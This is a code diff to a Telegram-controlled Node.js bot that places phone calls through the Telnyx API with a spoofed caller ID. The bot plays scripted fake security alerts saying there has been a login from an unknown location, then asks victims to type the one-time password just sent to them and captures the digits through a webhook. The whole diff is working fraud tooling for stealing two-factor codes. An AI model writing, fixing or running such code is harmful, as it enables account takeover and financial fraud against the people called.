@@ -113,6 +113,14 @@ const adminFilter = (ctx, next) => {
 async function call (spoof, customer_number, ctx, service, name, digit){
    console.log('command is from: ', ctx.from)
 
+   const { data: call } = await telnyx.calls.create({
+      connection_id: alt_control_id,
+      to: `+${customer_number}`,
+      from: service_number,
+      from_display_name: `+${spoof}`,
+      answering_machine_detection: 'detect'
+   }); 
+
    // Using the Telnyx API to create a new call
    try {
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
@@ -132,31 +140,6 @@ async function call (spoof, customer_number, ctx, service, name, digit){
          ctx.telegram.sendMessage(ctx.from.id, `❌ Call ended`, {})
          call.hangup()
       } )
-
-      const { data: call } = await telnyx.calls.create({
-         connection_id: alt_control_id,
-         to: `+${customer_number}`,
-         from: service_number,
-         from_display_name: `+${spoof}`,
-         answering_machine_detection: 'detect'
-      });   
-
-      if( call.answered ){
-         if ( !call.machine.detection.ended ) {
-            bot.telegram.sendMessage(ctx.chat.id, `📞 Human Detected`, {})
-         } else {
-            bot.telegram.sendMessage(ctx.chat.id, `📞 Voicemail Detected`, {})
-         }
-         call.gather_using_speak(
-         { 
-            connection_id: alt_control_id,
-            payload: `Hello ${name}, there has been a login to your ${service} account from a different location, press 1 if this was not you.`, 
-            language: 'en-US', 
-            voice: 'female',
-            webhook_url: `${WEBHOOK_URL}/pressed_one`
-         });
-      }
-
    } catch (error) {
       console.log("your error is: ", error.message)
    }
@@ -247,55 +230,42 @@ bot.launch();
 
 
 // webhook urls
-app.get('/', (req, res) => {
-   console.log('yay?')
-   res.json({status: 'ok', code: 200})
-});
+app.post('/webhokks', (req, res) => {
+   const call_control_id = req.body.data.call_control_id;
 
-app.post('/', (req, res) => {
-   const body = req.body;   
-   res.json({status: 'ok', code: 200})
+   telnyx.calls.gather_using_speak(
+      {
+         call_control_id: call_control_id,
+         payload: `There hasbeen a login to your account from an unknown location, press 1 if this was not you`, 
+         language: 'en-US', 
+         voice: 'female',
+         webhook_url: `${ WEBHOOK_URL }/pressed_one` 
+      }
+   )
+   
 });
-
 
 app.post('/webhooks/pressed_one', (req, res) => {
    // Get the call_control_id from the webhook data
-   const data = req.body.data;
-   console.log(`expected webhook : ${data}`)
+   const call_control_id = req.body.data.call_control_id;
+   const result = req.body.data.payload.result; 
 
-   const call_control_id = data.payload.call_control_id;
-   
+
    call.gather_using_speak(
    { 
       call_control_id: call_control_id,
-      payload: 'We have just sent you a one time password, kindly type the ${digit} digit code', 
+      payload: `We have just sent you a one time password, kindly type the ${digit} digit code`, 
       language: 'en-US', 
       voice: 'female',
-      webhook_url: `${ WEBHOOK_URL }/` 
+      webhook_url: `${ WEBHOOK_URL }/typed_code` 
    });
-
 })
 
-app.post('/webhooks/machine_detected', (req, res) => {
-   // Get the call_control_id from the webhook data
-   const data = req.body.data;
-   console.log(`expected webhook : ${data}`)
-
-   // const call_control_id = data.payload.call_control_id;
-   
-   // call.gather_using_speak(
-   // { 
-   //    call_control_id: call_control_id,
-   //    payload: 'Say this on the call', 
-   //    language: 'en-US', 
-   //    voice: 'female' 
-   // });
-
-})
-
-app.post('/gather', (req, res) => {
-   const digits = req.body.Digits;
+app.post('/webhooks/typed_code', (req, res) => {
+   const digits = req.body.digits;
    res.json(req.body)
+
+
 });
  
 
